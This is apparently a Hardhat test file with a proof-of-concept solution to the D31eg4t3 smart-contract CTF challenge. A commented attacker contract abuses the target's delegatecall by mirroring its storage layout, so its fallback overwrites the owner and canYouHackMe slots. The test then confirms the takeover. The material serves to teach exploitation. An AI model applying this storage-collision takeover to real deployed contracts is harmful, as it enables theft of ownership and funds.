 
//  Below is the detailed explanation and poc for the CTF of in hardhat and ether js

// contract AttackerContract_D31eg4t3 {
//    uint a = 12345;
//    uint8 b = 32;
//    string private d; 
//    uint32 private c; 
//    string private mot;
//    address public owner;
//    mapping (address => bool) public canYouHackMe;
//    address public target;


//    function call_target(address _target) public {
//        target =  _target;
//        D31eg4t3(target).hackMe(abi.encodePacked(bytes4(0x0000dead)));
//    }
//    fallback() external {
//        owner = tx.origin;
//        canYouHackMe[tx.origin] = true;
//    }
// }

// since D31eg4t3 uses delegate call (it runs the function logic of the called contract with it's own storage) assuming that it is safe.
// we exploit it by breaking the assumption, having a similar storage setup to the D31eg4t3 helps to change the slots required easiy. 
import {loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("D31eg4t3", function () {
 
  async function deploymentState() {

    // Contracts are deployed using the first signer/account by default
    const [owner, attacker] = await ethers.getSigners();

    const D31eg4t3 = await ethers.getContractFactory("D31eg4t3");
    const d31eg4t3 = await D31eg4t3.deploy();

    return { d31eg4t3,attacker,owner};
  }

  describe("Deployment", function () {
    it("Contract should be hacked", async function () {
      const {d31eg4t3,owner,attacker} = await loadFixture(deploymentState);

    //   console.log("owner-acc[1]",owner.address);
    //   console.log("owner from contract before tx",await d31eg4t3.owner());
      const AttackerContract = await ethers.getContractFactory("AttackerContract_D31eg4t3");
      const attackerContract = await AttackerContract.connect(attacker).deploy();
        
      const call_target_tx = await attackerContract.connect(attacker).call_target(d31eg4t3.address);
      await call_target_tx.wait();

    //   console.log("attacker address",attacker.address)
    //   console.log("owner from contract before tx",await d31eg4t3.owner());
      
      const hacked = await d31eg4t3.canYouHackMe(attacker.address);
      const owner_From_contract = await d31eg4t3.owner();
      await expect(hacked).to.equal(true);
      await  expect(owner_From_contract).to.equal(attacker.address);
    });

  })
})
